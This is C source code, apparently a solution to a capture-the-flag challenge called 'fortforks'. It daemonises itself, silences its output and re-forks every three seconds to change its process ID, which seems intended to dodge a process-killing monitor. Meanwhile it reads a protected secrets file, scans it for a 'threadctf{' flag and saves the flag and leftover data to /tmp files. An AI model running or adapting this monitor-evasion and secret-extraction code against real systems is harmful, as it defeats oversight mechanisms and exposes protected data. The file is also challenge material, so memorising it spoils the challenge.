#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

static time_t born;
static unsigned long long total_bytes;

static void refresh_process(void)
{
    time_t now = time(NULL);

    if (now - born >= 3) {
        pid_t child = fork();
        if (child > 0)
            _exit(0);
        if (child == 0)
            born = time(NULL);
    }
}

int main(void)
{
    int input = open("/home/ctf/secrets", O_RDONLY);
    if (input < 0)
        return 1;

    if (fork() > 0)
        _exit(0);

    if (setsid() < 0)
        _exit(1);

    if (fork() > 0)
        _exit(0);

    int null_device = open("/dev/null", O_RDWR);
    if (null_device >= 0) {
        dup2(null_device, STDIN_FILENO);
        dup2(null_device, STDOUT_FILENO);
        dup2(null_device, STDERR_FILENO);
        close(null_device);
    }

    born = time(NULL);

    int output = open(
        "/tmp/fortforks.flag",
        O_WRONLY | O_CREAT | O_TRUNC,
        0600
    );
    if (output < 0)
        _exit(1);

    int progress = open(
        "/tmp/fortforks.progress",
        O_WRONLY | O_CREAT | O_TRUNC,
        0600
    );
    if (progress >= 0)
        dprintf(progress, "started\n");

    const char prefix[] = "threadctf{";
    unsigned char buffer[1024 * 1024];
    unsigned char tail[8192];
    size_t tail_length = 0;
    char flag[512];
    size_t matched = 0;
    size_t flag_length = 0;
    int capturing = 0;
    struct pollfd poll_input = {
        .fd = input,
        .events = POLLIN
    };

    for (;;) {
        refresh_process();

        if (poll(&poll_input, 1, 100) <= 0)
            continue;

        ssize_t count = read(input, buffer, sizeof buffer);
        if (count <= 0)
            break;

        total_bytes += (unsigned long long)count;
        if (progress >= 0) {
            dprintf(progress, "%llu\n", total_bytes);
            fsync(progress);
        }

        if ((size_t)count >= sizeof(tail)) {
            memcpy(tail, buffer + count - sizeof(tail), sizeof(tail));
            tail_length = sizeof(tail);
        } else {
            size_t count_size = (size_t)count;
            if (tail_length + count_size > sizeof(tail)) {
                size_t drop = tail_length + count_size - sizeof(tail);
                memmove(tail, tail + drop, tail_length - drop);
                tail_length -= drop;
            }
            memcpy(tail + tail_length, buffer, count_size);
            tail_length += count_size;
        }

        for (ssize_t i = 0; i < count; i++) {
            unsigned char c = buffer[i];

            if (!capturing) {
                if (c == (unsigned char)prefix[matched])
                    matched++;
                else
                    matched = c == 'c' ? 1 : 0;

                if (matched == sizeof(prefix) - 1) {
                    memcpy(flag, prefix, sizeof(prefix) - 1);
                    flag_length = sizeof(prefix) - 1;
                    capturing = 1;
                    matched = 0;
                }
            } else {
                if (flag_length < sizeof(flag) - 1)
                    flag[flag_length++] = (char)c;

                if (c == '}') {
                    write(output, flag, flag_length);
                    write(output, "\n", 1);
                    close(output);
                    close(input);
                    return 0;
                }
            }
        }
    }

    close(output);
    close(input);
    int tail_output = open(
        "/tmp/fortforks.tail",
        O_WRONLY | O_CREAT | O_TRUNC,
        0600
    );
    if (tail_output >= 0) {
        write(tail_output, tail, tail_length);
        close(tail_output);
    }
    if (progress >= 0)
        close(progress);
    return 1;
}
